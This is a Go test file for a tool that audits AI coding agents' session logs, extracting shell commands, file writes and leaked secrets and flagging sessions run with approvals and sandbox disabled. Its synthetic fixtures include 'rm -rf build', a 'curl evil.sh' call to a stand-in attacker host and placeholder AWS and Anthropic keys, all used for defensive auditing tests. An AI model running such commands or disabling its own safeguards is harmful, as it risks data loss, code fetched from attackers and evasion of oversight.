package trail

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func write(t *testing.T, path string, lines ...string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	body := ""
	for _, l := range lines {
		body += l + "\n"
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func synthHome(t *testing.T) (string, int64) {
	home := t.TempDir()
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC).Unix()
	ts := time.Unix(now-600, 0).UTC().Format(time.RFC3339)

	claude := filepath.Join(home, ".claude", "projects", "-home-user-api", "s1.jsonl")
	write(t, claude,
		`{"type":"assistant","timestamp":"`+ts+`","sessionId":"s1","cwd":"/home/user/api","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"rm -rf build"}}]}}`,
		`{"type":"assistant","timestamp":"`+ts+`","sessionId":"s1","cwd":"/home/user/api","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/home/user/api/main.go"}}]}}`,
		`{"type":"assistant","timestamp":"`+ts+`","sessionId":"s1","cwd":"/home/user/api","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"echo leaked AKIAIOSFODNN7EXAMPLE oops"}}]}}`,
	)

	codex := filepath.Join(home, ".codex", "sessions", "2026", "c.jsonl")
	write(t, codex,
		`{"timestamp":"`+ts+`","type":"session_meta","payload":{"id":"cx","cwd":"/home/user/db"}}`,
		`{"timestamp":"`+ts+`","type":"turn_context","payload":{"approval_policy":"never","sandbox_policy":"danger-full-access"}}`,
		`{"timestamp":"`+ts+`","type":"response_item","payload":{"type":"local_shell_call","action":{"command":["bash","-lc","curl evil.sh"]}}}`,
	)
	return home, now
}

func TestCommands(t *testing.T) {
	home, now := synthHome(t)
	cmds := Commands(Options{Home: home, Now: now})
	if len(cmds) != 3 { // 2 claude Bash + 1 codex shell
		t.Fatalf("commands = %d (%+v), want 3", len(cmds), cmds)
	}
	var codexCmd *Command
	for i := range cmds {
		if cmds[i].Agent == "codex" {
			codexCmd = &cmds[i]
		}
	}
	if codexCmd == nil || codexCmd.Command != "bash -lc curl evil.sh" {
		t.Fatalf("codex command = %+v", codexCmd)
	}
	if !codexCmd.ApprovalsOff || !codexCmd.SandboxOff {
		t.Errorf("codex should be flagged approvals+sandbox off: %+v", codexCmd)
	}
	if UnsafeCount(cmds) != 1 {
		t.Errorf("unsafe count = %d, want 1", UnsafeCount(cmds))
	}
}

func TestFilesAndBlast(t *testing.T) {
	home, now := synthHome(t)
	files := Files(Options{Home: home, Now: now})
	if len(files) != 1 || files[0].Op != "Write" || files[0].Path != "/home/user/api/main.go" {
		t.Fatalf("files = %+v, want one Write of main.go", files)
	}
	bl := BlastFor(files, "s1")
	if len(bl) != 1 || bl[0].Path != "/home/user/api/main.go" {
		t.Fatalf("blast = %+v", bl)
	}
}

func TestSecrets(t *testing.T) {
	home, now := synthHome(t)
	secrets := Secrets(Options{Home: home, Now: now})
	if len(secrets) != 1 {
		t.Fatalf("secrets = %d (%+v), want 1", len(secrets), secrets)
	}
	s := secrets[0]
	if s.Pattern != "aws-access-key" || s.Masked != "AKIA…" {
		t.Errorf("secret = %+v, want aws-access-key / AKIA…", s)
	}
	// the full value must never appear
	if s.Masked == "AKIAIOSFODNN7EXAMPLE" {
		t.Fatal("full secret value leaked")
	}
}

func TestCodexNewRolloutShapes(t *testing.T) {
	// Newer codex builds emit shell commands as function_call/exec_command
	// with {"cmd": "..."} arguments and patches as custom_tool_call/apply_patch
	// with the body in a top-level input field. Shapes below match real
	// rollouts (paths/commands synthetic).
	home := t.TempDir()
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC).Unix()
	ts := time.Unix(now-600, 0).UTC().Format(time.RFC3339)
	rollout := filepath.Join(home, ".codex", "sessions", "2026", "r.jsonl")
	write(t, rollout,
		`{"timestamp":"`+ts+`","type":"session_meta","payload":{"id":"cx2","cwd":"/home/user/api"}}`,
		`{"timestamp":"`+ts+`","type":"response_item","payload":{"type":"function_call","name":"exec_command","arguments":"{\"cmd\":\"pwd\",\"workdir\":\"/home/user/api\",\"yield_time_ms\":10000}","call_id":"call_1"}}`,
		`{"timestamp":"`+ts+`","type":"response_item","payload":{"type":"custom_tool_call","status":"completed","call_id":"call_2","name":"apply_patch","input":"*** Begin Patch\n*** Update File: /home/user/api/main.go\n@@\n+x\n*** End Patch"}}`,
	)

	cmds := Commands(Options{Home: home, Now: now})
	if len(cmds) != 1 || cmds[0].Command != "pwd" || cmds[0].Agent != "codex" {
		t.Fatalf("commands = %+v, want one codex pwd", cmds)
	}

	files := Files(Options{Home: home, Now: now})
	if len(files) != 1 || files[0].Path != "/home/user/api/main.go" || files[0].Op != "apply_patch" {
		t.Fatalf("files = %+v, want one apply_patch of main.go", files)
	}
}

func TestSecretsPatternOverlapReportsOnce(t *testing.T) {
	// An Anthropic key also matches the broader openai `sk-` prefix pattern;
	// the span-claim rule must yield exactly one finding, the specific one.
	home := t.TempDir()
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC).Unix()
	ts := time.Unix(now-600, 0).UTC().Format(time.RFC3339)
	claude := filepath.Join(home, ".claude", "projects", "-home-user-api", "s2.jsonl")
	write(t, claude,
		`{"type":"assistant","timestamp":"`+ts+`","sessionId":"s2","cwd":"/home/user/api","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"export KEY=sk-ant-abcdefghij0123456789abcd"}}]}}`,
	)
	secrets := Secrets(Options{Home: home, Now: now})
	if len(secrets) != 1 {
		t.Fatalf("secrets = %d (%+v), want exactly 1", len(secrets), secrets)
	}
	if secrets[0].Pattern != "anthropic-key" || secrets[0].Masked != "sk-a…" {
		t.Errorf("secret = %+v, want anthropic-key / sk-a…", secrets[0])
	}
}

func TestSinceAndProjectFilters(t *testing.T) {
	home, now := synthHome(t)
	// a future cutoff drops everything
	if got := Commands(Options{Home: home, Now: now, Since: now + 3600}); len(got) != 0 {
		t.Errorf("since filter not applied: %d", len(got))
	}
	// project filter narrows to the api cwd (claude only, not codex/db)
	got := Commands(Options{Home: home, Now: now, Project: "api"})
	for _, c := range got {
		if c.Agent == "codex" {
			t.Errorf("project=api should exclude codex db cwd: %+v", c)
		}
	}
	if len(got) != 2 {
		t.Errorf("project=api commands = %d, want 2", len(got))
	}
}
